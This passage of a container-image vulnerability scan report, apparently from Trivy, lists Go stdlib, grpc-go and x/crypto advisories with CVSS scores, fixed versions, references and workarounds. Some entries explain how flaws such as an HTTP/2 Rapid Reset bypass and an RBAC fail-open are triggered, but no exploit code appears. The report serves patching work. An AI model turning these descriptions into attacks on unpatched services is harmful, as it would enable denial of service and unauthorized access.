│     │      │                   This could result in a runtime panic when the RBAC engine attempts to
│     │      │                   authorize an incoming request.
│     │      │                   An attacker or misconfigured/malicious xDS management server delivering an
│     │      │                   LDS/RDS update containing a `NOT` rule around an unhandled field causes the
│     │      │                   gRPC server process to crash immediately (CWE-248 / Denial of Service).
│     │      │                   ### Patches
│     │      │                   _Has the problem been patched? What versions should users upgrade to?_
│     │      │                   All three issues have been fixed in `master` and will be released in 1.82.1
│     │      │                   shortly.
│     │      │                   ### Workarounds
│     │      │                   _Is there a way for users to fix or remediate the vulnerability without
│     │      │                   upgrading?_
│     │      │                   If upgrading grpc-go immediately is not possible, apply the following
│     │      │                   workarounds based on your deployment architecture:
│     │      │                   * For xDS RBAC Vulnerabilities & Panics: Ensure that upstream xDS management
│     │      │                   servers do not push RBAC policies containing `Metadata`,
│     │      │                   `RequestedServerName`, or `NOT` rules wrapping unsupported fields (such as
│     │      │                   `SourcedMetadata`) to grpc-go servers.
│     │      │                   * For HTTP/2 Rapid Reset DOS: Configure upstream reverse proxies or load
│     │      │                   balancers (such as Envoy) with strict HTTP/2 `max_concurrent_streams` limits
│     │      │                   and active rate limiting on `RST_STREAM` frequency per connection.
│     │      │                   ### Severity
│     │      │                     | Vulnerability | Qualitative Severity | Approximate CVSS v3.1 Score |
│     │      │                   Primary Impact |
│     │      │                     | :--- | :--- | :--- | :--- |
│     │      │                     | **xDS RBAC Authorization Bypass** | **High** | `8.2` | Unauthorized Access
│     │      │                    / Fail-Open |
│     │      │                     | **HTTP/2 Rapid Reset DOS Bypass** | **High** | `7.5` | High CPU
│     │      │                   Consumption / Denial of Service |
│     │      │                     | **xDS RBAC Engine Server Panic** | **Medium** | `5.9` | Process Crash /
│     │      │                   Denial of Service | 
│     │      ├ Severity        : HIGH 
│     │      ├ VendorSeverity   ─ ghsa: 3 
│     │      ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/
│     │      │                         │            SA:N 
│     │      │                         ╰ V40Score : 8.8 
│     │      ├ References       ╭ [0]: https://github.com/grpc/grpc-go 
│     │      │                  ├ [1]: https://github.com/grpc/grpc-go/commit/4ea465d4ab98013f72a142fe0fc89c197
│     │      │                  │      70b2935 
│     │      │                  ├ [2]: https://github.com/grpc/grpc-go/pull/9236 
│     │      │                  ├ [3]: https://github.com/grpc/grpc-go/releases/tag/v1.82.1 
│     │      │                  ╰ [4]: https://github.com/grpc/grpc-go/security/advisories/GHSA-hrxh-6v49-42gf 
│     │      ├ PublishedDate   : 2026-07-21T22:03:55Z 
│     │      ╰ LastModifiedDate: 2026-07-21T22:03:56Z 
│     ├ [36] ╭ VulnerabilityID : CVE-2026-27145 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5037 
│     │      ├ PkgID           : stdlib@v1.26.3 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
│     │      │                  ╰ UID : e00080c3aecda74f 
│     │      ├ InstalledVersion: v1.26.3 
│     │      ├ FixedVersion    : 1.25.11, 1.26.4 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-27145 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:f11fe8dcc9d2e63961e4c2c369f4ceb9c570d324699f376148d211cb1ef1cf49 
│     │      ├ Title           : crypto/x509: golang: golang crypto/x509: Denial of Service via excessive
│     │      │                   processing of DNS SAN entries 
│     │      ├ Description     : (*x509.Certificate).VerifyHostname previously called matchHostnames in a loop
│     │      │                   over all DNS Subject Alternative Name (SAN) entries. This caused
│     │      │                   strings.Split(host, ".") to execute repeatedly on the same input hostname.
│     │      │                   With a large DNS SAN list, verification costs scaled quadratically based on
│     │      │                   the number of SAN entries multiplied by the hostname's label count. Because
│     │      │                   x509.Verify validates hostnames before building the certificate chain, this
│     │      │                   overhead occurred even for untrusted certificates. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-606 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 2 
│     │      │                  ├ bitnami    : 2 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:H 
│     │      │                  │         ╰ V3Score : 6.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:23262 
│     │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:23264 
│     │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:29981 
│     │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:33574 
│     │      │                  ├ [4] : https://access.redhat.com/errata/RHSA-2026:34357 
│     │      │                  ├ [5] : https://access.redhat.com/errata/RHSA-2026:34359 
│     │      │                  ├ [6] : https://access.redhat.com/errata/RHSA-2026:35832 
│     │      │                  ├ [7] : https://access.redhat.com/errata/RHSA-2026:36317 
│     │      │                  ├ [8] : https://access.redhat.com/errata/RHSA-2026:36648 
│     │      │                  ├ [9] : https://access.redhat.com/errata/RHSA-2026:36797 
│     │      │                  ├ [10]: https://access.redhat.com/errata/RHSA-2026:38995 
│     │      │                  ├ [11]: https://access.redhat.com/errata/RHSA-2026:39005 
│     │      │                  ├ [12]: https://access.redhat.com/errata/RHSA-2026:39573 
│     │      │                  ├ [13]: https://access.redhat.com/errata/RHSA-2026:39879 
│     │      │                  ├ [14]: https://access.redhat.com/errata/RHSA-2026:41030 
│     │      │                  ├ [15]: https://access.redhat.com/errata/RHSA-2026:41036 
│     │      │                  ├ [16]: https://access.redhat.com/errata/RHSA-2026:41930 
│     │      │                  ├ [17]: https://access.redhat.com/errata/RHSA-2026:42043 
│     │      │                  ├ [18]: https://access.redhat.com/errata/RHSA-2026:42047 
│     │      │                  ├ [19]: https://access.redhat.com/errata/RHSA-2026:42049 
│     │      │                  ├ [20]: https://access.redhat.com/errata/RHSA-2026:42050 
│     │      │                  ├ [21]: https://access.redhat.com/errata/RHSA-2026:42051 
│     │      │                  ├ [22]: https://access.redhat.com/errata/RHSA-2026:42079 
│     │      │                  ├ [23]: https://access.redhat.com/errata/RHSA-2026:42080 
│     │      │                  ├ [24]: https://access.redhat.com/errata/RHSA-2026:42082 
│     │      │                  ├ [25]: https://access.redhat.com/errata/RHSA-2026:42142 
│     │      │                  ├ [26]: https://access.redhat.com/errata/RHSA-2026:42150 
│     │      │                  ├ [27]: https://access.redhat.com/errata/RHSA-2026:42151 
│     │      │                  ├ [28]: https://access.redhat.com/errata/RHSA-2026:42240 
│     │      │                  ├ [29]: https://access.redhat.com/errata/RHSA-2026:42644 
│     │      │                  ├ [30]: https://access.redhat.com/errata/RHSA-2026:42946 
│     │      │                  ├ [31]: https://access.redhat.com/security/cve/CVE-2026-27145 
│     │      │                  ├ [32]: https://bugzilla.redhat.com/2445356 
│     │      │                  ├ [33]: https://bugzilla.redhat.com/2484207 
│     │      │                  ├ [34]: https://bugzilla.redhat.com/show_bug.cgi?id=2480756 
│     │      │                  ├ [35]: https://bugzilla.redhat.com/show_bug.cgi?id=2484207 
│     │      │                  ├ [36]: https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
│     │      │                  ├ [37]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27145 
│     │      │                  ├ [38]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39821 
│     │      │                  ├ [39]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39822 
│     │      │                  ├ [40]: https://errata.almalinux.org/9/ALSA-2026-36317.html 
│     │      │                  ├ [41]: https://errata.rockylinux.org/RLSA-2026:38995 
│     │      │                  ├ [42]: https://go.dev/cl/783621 
│     │      │                  ├ [43]: https://go.dev/issue/79694 
│     │      │                  ├ [44]: https://groups.google.com/g/golang-announce/c/tKs3rmcBcKw 
│     │      │                  ├ [45]: https://linux.oracle.com/cve/CVE-2026-27145.html 
│     │      │                  ├ [46]: https://linux.oracle.com/errata/ELSA-2026-39573.html 
│     │      │                  ├ [47]: https://nvd.nist.gov/vuln/detail/CVE-2026-27145 
│     │      │                  ├ [48]: https://pkg.go.dev/vuln/GO-2026-5037 
│     │      │                  ├ [49]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-27145
│     │      │                  │       .json 
│     │      │                  ╰ [50]: https://www.cve.org/CVERecord?id=CVE-2026-27145 
│     │      ├ PublishedDate   : 2026-06-02T23:16:35.57Z 
│     │      ╰ LastModifiedDate: 2026-07-22T19:10:00.12Z 
│     ├ [37] ╭ VulnerabilityID : CVE-2026-39822 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4970 
│     │      ├ PkgID           : stdlib@v1.26.3 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
│     │      │                  ╰ UID : e00080c3aecda74f 
│     │      ├ InstalledVersion: v1.26.3 
│     │      ├ FixedVersion    : 1.25.12, 1.26.5, 1.27.0-rc.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39822 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:47a42d38ab3e8ad43b5cf99a2886b7483163515d3999f2caa32ab6f94806725b 
│     │      ├ Title           : os: golang: Go os.Root: Symlink following vulnerability allows directory
│     │      │                   traversal 
│     │      ├ Description     : On Unix systems, opening a file in an os.Root improperly follows symlinks to
│     │      │                   locations outside of the Root when the final path component of the a path is a
│     │      │                    symbolic link and the path ends in /. For example, 'root.Open("symlink/")'
│     │      │                   will open "symlink" even when "symlink" is a symbolic link pointing outside of
│     │      │                    the root. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-61 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 2 
│     │      │                  ├ bitnami    : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H 
│     │      │                  │         ╰ V3Score : 7.8 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H 
│     │      │                            ╰ V3Score : 7.8 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:38878 
│     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-39822 
│     │      │                  ├ [2] : https://bugzilla.redhat.com/2498152 
│     │      │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2480756 
│     │      │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2484207 
│     │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
│     │      │                  ├ [6] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27145 
│     │      │                  ├ [7] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39821 
│     │      │                  ├ [8] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39822 
│     │      │                  ├ [9] : https://errata.almalinux.org/9/ALSA-2026-38878.html 
│     │      │                  ├ [10]: https://errata.rockylinux.org/RLSA-2026:38995 
│     │      │                  ├ [11]: https://go.dev/cl/797880 
│     │      │                  ├ [12]: https://go.dev/issue/79005 
│     │      │                  ├ [13]: https://groups.google.com/g/golang-announce/c/OrmQE_Yp5Sc 
│     │      │                  ├ [14]: https://linux.oracle.com/cve/CVE-2026-39822.html 
│     │      │                  ├ [15]: https://linux.oracle.com/errata/ELSA-2026-38995.html 
│     │      │                  ├ [16]: https://nvd.nist.gov/vuln/detail/CVE-2026-39822 
│     │      │                  ├ [17]: https://pkg.go.dev/vuln/GO-2026-4970 
│     │      │                  ╰ [18]: https://www.cve.org/CVERecord?id=CVE-2026-39822 
│     │      ├ PublishedDate   : 2026-07-08T17:17:21.31Z 
│     │      ╰ LastModifiedDate: 2026-07-13T14:54:26.317Z 
│     ├ [38] ╭ VulnerabilityID : CVE-2026-42504 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5038 
│     │      ├ PkgID           : stdlib@v1.26.3 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
│     │      │                  ╰ UID : e00080c3aecda74f 
│     │      ├ InstalledVersion: v1.26.3 
│     │      ├ FixedVersion    : 1.25.11, 1.26.4 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42504 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:90a850d402113369ddfa25f7abcc39db9dd2ef9755a88525a7073c7229904d3b 
│     │      ├ Title           : mime: golang: Golang MIME: Denial of Service via maliciously-crafted MIME header 
│     │      ├ Description     : Decoding a maliciously-crafted MIME header containing many invalid
│     │      │                   encoded-words can consume excessive CPU. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-407 
│     │      ├ VendorSeverity   ╭ amazon : 2 
│     │      │                  ├ azure  : 3 
│     │      │                  ├ bitnami: 3 
│     │      │                  ╰ redhat : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-42504 
│     │      │                  ├ [1]: https://go.dev/cl/774481 
│     │      │                  ├ [2]: https://go.dev/issue/79217 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/tKs3rmcBcKw 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-42504 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5038 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42504 
│     │      ├ PublishedDate   : 2026-06-02T23:16:37.927Z 
│     │      ╰ LastModifiedDate: 2026-07-22T19:10:00.12Z 
│     ├ [39] ╭ VulnerabilityID : CVE-2026-42505 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5856 
│     │      ├ PkgID           : stdlib@v1.26.3 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
│     │      │                  ╰ UID : e00080c3aecda74f 
│     │      ├ InstalledVersion: v1.26.3 
│     │      ├ FixedVersion    : 1.25.12, 1.26.5, 1.27.0-rc.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42505 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:e61131eb0650f74d0a34710f4eaeba206a5666d8c8b91083b912c2573d446a4f 
│     │      ├ Title           : crypto/tls: golang: Go crypto/tls: Information disclosure in Encrypted Client
│     │      │                   Hello 
│     │      ├ Description     : Handshakes which used Encrypted Client Hello could be de-anonymized by a
│     │      │                   passive network observer due to a disclosure of pre-shared key identities in
│     │      │                   the unencrypted client hello. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-201 
│     │      ├ VendorSeverity   ╭ amazon : 2 
│     │      │                  ├ bitnami: 2 
│     │      │                  ╰ redhat : 2 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N 
│     │      │                  │         ╰ V3Score : 5.3 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N 
│     │      │                            ╰ V3Score : 5.3 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-42505 
│     │      │                  ├ [1]: https://go.dev/cl/775960 
│     │      │                  ├ [2]: https://go.dev/issue/79282 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/OrmQE_Yp5Sc 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-42505 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5856 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42505 
│     │      ├ PublishedDate   : 2026-07-08T17:17:21.497Z 
│     │      ╰ LastModifiedDate: 2026-07-13T17:05:36.303Z 
│     ╰ [40] ╭ VulnerabilityID : CVE-2026-42507 
│            ├ VendorIDs        ─ [0]: GO-2026-5039 
│            ├ PkgID           : stdlib@v1.26.3 
│            ├ PkgName         : stdlib 
│            ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
│            │                  ╰ UID : e00080c3aecda74f 
│            ├ InstalledVersion: v1.26.3 
│            ├ FixedVersion    : 1.25.11, 1.26.4 
│            ├ Status          : fixed 
│            ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│            │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│            ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42507 
│            ├ DataSource       ╭ ID  : govulndb 
│            │                  ├ Name: The Go Vulnerability Database 
│            │                  ╰ URL : https://pkg.go.dev/vuln/ 
│            ├ Fingerprint     : sha256:823cd66ebdc2f94d2972075b7184cf10954035f2bda19d16708beac2af5e7d9d 
│            ├ Title           : net/textproto: golang: Golang net/textproto: Misleading error messages via
│            │                   input injection 
│            ├ Description     : When returning errors, functions in the net/textproto package would include
│            │                   its input as part of the error. This might allow an attacker to inject
│            │                   misleading content to errors that are printed or logged. 
│            ├ Severity        : MEDIUM 
│            ├ VendorSeverity   ╭ alma       : 2 
│            │                  ├ amazon     : 2 
│            │                  ├ bitnami    : 2 
│            │                  ├ oracle-oval: 2 
│            │                  ├ redhat     : 2 
│            │                  ╰ rocky      : 2 
│            ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N 
│            │                  │         ╰ V3Score : 5.3 
│            │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N 
│            │                            ╰ V3Score : 5.3 
│            ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:29981 
│            │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-42507 
│            │                  ├ [2] : https://bugzilla.redhat.com/2484205 
│            │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2484205 
│            │                  ├ [4] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-42507 
│            │                  ├ [5] : https://errata.almalinux.org/9/ALSA-2026-29981.html 
│            │                  ├ [6] : https://errata.rockylinux.org/RLSA-2026:29980 
│            │                  ├ [7] : https://go.dev/cl/777060 
│            │                  ├ [8] : https://go.dev/issue/79346 
│            │                  ├ [9] : https://groups.google.com/g/golang-announce/c/tKs3rmcBcKw 
│            │                  ├ [10]: https://linux.oracle.com/cve/CVE-2026-42507.html 
│            │                  ├ [11]: https://linux.oracle.com/errata/ELSA-2026-29981.html 
│            │                  ├ [12]: https://nvd.nist.gov/vuln/detail/CVE-2026-42507 
│            │                  ├ [13]: https://pkg.go.dev/vuln/GO-2026-5039 
│            │                  ╰ [14]: https://www.cve.org/CVERecord?id=CVE-2026-42507 
│            ├ PublishedDate   : 2026-06-02T23:16:38.027Z 
│            ╰ LastModifiedDate: 2026-07-22T19:10:00.12Z 
╰ [7] ╭ [0] ╭ VulnerabilityID : GO-2026-5932 
      │     ├ PkgID           : golang.org/x/crypto@v0.54.0 
      │     ├ PkgName         : golang.org/x/crypto 
      │     ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/crypto@v0.54.0 
      │     │                  ╰ UID : cb267a106a2d658a 
      │     ├ InstalledVersion: v0.54.0 
      │     ├ Status          : affected 
      │     ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
      │     │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
      │     ├ DataSource       ╭ ID  : govulndb 
      │     │                  ├ Name: The Go Vulnerability Database 
      │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
      │     ├ Fingerprint     : sha256:cdd004daa98036153d58a755db0d88aa24cb5b7b6b7d803995dfe96d9c172b8b 
      │     ├ Title           : The golang.org/x/crypto/openpgp package is unmaintained, unsafe by design, and
      │     │                   has known security issues 
      │     ├ Description     : The golang.org/x/crypto/openpgp package is unsafe by design, has numerous known
      │     │                    security issues, is not maintained, and should not be used.
      │     │                   
      │     │                   If you are required to interoperate with OpenPGP systems and need a maintained
      │     │                   package, consider github.com/ProtonMail/go-crypto/openpgp which is a maintained
      │     │                    fork that aims to be a drop-in replacement for this package. 
      │     ├ Severity        : UNKNOWN 
      │     ╰ References       ╭ [0]: https://go.dev/issue/44226 
      │                        ╰ [1]: https://pkg.go.dev/vuln/GO-2026-5932 
      ├ [1] ╭ VulnerabilityID : GHSA-hrxh-6v49-42gf 
      │     ├ PkgID           : google.golang.org/grpc@v1.80.0 
      │     ├ PkgName         : google.golang.org/grpc 
      │     ├ PkgIdentifier    ╭ PURL: pkg:golang/google.golang.org/grpc@v1.80.0 
      │     │                  ╰ UID : c6d370e1e94988e1 
      │     ├ InstalledVersion: v1.80.0 
      │     ├ FixedVersion    : 1.82.1 
      │     ├ Status          : fixed 
      │     ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
      │     │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
      │     ├ SeveritySource  : ghsa 
      │     ├ PrimaryURL      : https://github.com/advisories/GHSA-hrxh-6v49-42gf 
      │     ├ DataSource       ╭ ID  : ghsa 
      │     │                  ├ Name: GitHub Security Advisory Go 
      │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
      │     ├ Fingerprint     : sha256:7bf91140d15e7ee494f7288ba7b65d394c58e7c316ba9d38a14d11b7c4e21295 
      │     ├ Title           : gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities 
      │     ├ Description     : Multiple security vulnerabilities have been identified and addressed in grpc-go
      │     │                    affecting the xDS RBAC authorization engine (internal/xds/rbac) and the HTTP/2
      │     │                    transport server implementation (internal/transport). These vulnerabilities
      │     │                   could result in:
      │     │                   
      │     │                   - Authorization Bypass (Fail-Open) when translating xDS RBAC policies
      │     │                   containing `Metadata` or `RequestedServerName` fields.
      │     │                   - Denial of Service (High CPU Consumption) due to an HTTP/2 Rapid Reset
      │     │                   mitigation bypass during client-initiated stream resets.
      │     │                   - Denial of Service (Server Panic) when parsing crafted xDS RBAC policies
      │     │                   containing `NOT` rules around unsupported fields.
      │     │                   ### Impact
      │     │                   _What kind of vulnerability is it? Who is impacted?_
      │     │                   #### xDS RBAC Authorization Bypass via `Metadata` & `RequestedServerName`
      │     │                   matchers
      │     │                   - Affected Component: xDS RBAC 
      │     │                   - Impact: When building policy matchers for gRPC RBAC from xDS configurations,
      │     │                   unsupported `permission` and `principal` rules (specifically `Metadata` and
      │     │                   `RequestedServerName`) were silently ignored and treated as no-ops.
      │     │                     - If an authorization policy relied purely on these matchers for access
      │     │                   control, treating those rules as no-ops effectively removed the restrictions.
      │     │                   - If these unsupported rules were nested inside logical `NOT` rules
      │     │                   (`Permission_NotRule` / `Principal_NotId`) or multi-condition `OR/AND` rules,
      │     │                   silently dropping them changed the boolean logic flow of the authorization
      │     │                   engine.
      │     │                   As a result, policy evaluation decisions could fail open, allowing unauthorized
      │     │                    clients to access protected gRPC services or resources.
      │     │                   #### HTTP/2 Rapid Reset Mitigation Bypass / Denial of Service via Stream
      │     │                   Aborts
      │     │                   - Affected Component: HTTP/2 transport
      │     │                   - Impact: Earlier mitigations in grpc-go for HTTP/2 Rapid Reset only applied
      │     │                   threshold checks to items that directly resulted in control frames being
      │     │                   written back to the wire, such as `SETTINGS` ACKs or server-initiated
      │     │                   `RST_STREAM`s.
      │     │                   When a client initiated a rapid flood of stream creation (`HEADERS`)
      │     │                   immediately followed by stream termination `RST_STREAM`, items queued up in the
      │     │                    control buffer without counting against the transport response frame
      │     │                   threshold. An attacker can repeatedly trigger this flood sequence to bypass
      │     │                   reader blocking, resulting in high CPU usage, and Denial of Service (DoS).
      │     │                   #### Denial of Service (Panic) in xDS RBAC Engine via Unsupported Fields inside
      │     │                    NOT Rules
      │     │                   - Impact: The xDS RBAC policy translators recursively generate matchers for
      │     │                   nested rules. When a `NOT` rule wrapped an unsupported or unhandled field (such
      │     │                    as `SourcedMetadata`), the recursive step returned an empty matcher. This
      │     │                   could result in a runtime panic when the RBAC engine attempts to authorize an
      │     │                   incoming request.
      │     │                   An attacker or misconfigured/malicious xDS management server delivering an
      │     │                   LDS/RDS update containing a `NOT` rule around an unhandled field causes the
      │     │                   gRPC server process to crash immediately (CWE-248 / Denial of Service).
      │     │                   ### Patches
      │     │                   _Has the problem been patched? What versions should users upgrade to?_
      │     │                   All three issues have been fixed in `master` and will be released in 1.82.1
      │     │                   shortly.
      │     │                   ### Workarounds
      │     │                   _Is there a way for users to fix or remediate the vulnerability without
      │     │                   upgrading?_
      │     │                   If upgrading grpc-go immediately is not possible, apply the following
      │     │                   workarounds based on your deployment architecture:
      │     │                   * For xDS RBAC Vulnerabilities & Panics: Ensure that upstream xDS management
      │     │                   servers do not push RBAC policies containing `Metadata`, `RequestedServerName`,
      │     │                    or `NOT` rules wrapping unsupported fields (such as `SourcedMetadata`) to
      │     │                   grpc-go servers.
      │     │                   * For HTTP/2 Rapid Reset DOS: Configure upstream reverse proxies or load
      │     │                   balancers (such as Envoy) with strict HTTP/2 `max_concurrent_streams` limits
      │     │                   and active rate limiting on `RST_STREAM` frequency per connection.
      │     │                   ### Severity
      │     │                     | Vulnerability | Qualitative Severity | Approximate CVSS v3.1 Score |
      │     │                   Primary Impact |
      │     │                     | :--- | :--- | :--- | :--- |
      │     │                     | **xDS RBAC Authorization Bypass** | **High** | `8.2` | Unauthorized Access
      │     │                   / Fail-Open |
      │     │                     | **HTTP/2 Rapid Reset DOS Bypass** | **High** | `7.5` | High CPU Consumption
      │     │                    / Denial of Service |
      │     │                     | **xDS RBAC Engine Server Panic** | **Medium** | `5.9` | Process Crash /
      │     │                   Denial of Service | 
      │     ├ Severity        : HIGH 
      │     ├ VendorSeverity   ─ ghsa: 3 
      │     ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/S
      │     │                         │            A:N 
      │     │                         ╰ V40Score : 8.8 
      │     ├ References       ╭ [0]: https://github.com/grpc/grpc-go 
      │     │                  ├ [1]: https://github.com/grpc/grpc-go/commit/4ea465d4ab98013f72a142fe0fc89c1977
      │     │                  │      0b2935 
      │     │                  ├ [2]: https://github.com/grpc/grpc-go/pull/9236 
      │     │                  ├ [3]: https://github.com/grpc/grpc-go/releases/tag/v1.82.1 
      │     │                  ╰ [4]: https://github.com/grpc/grpc-go/security/advisories/GHSA-hrxh-6v49-42gf 
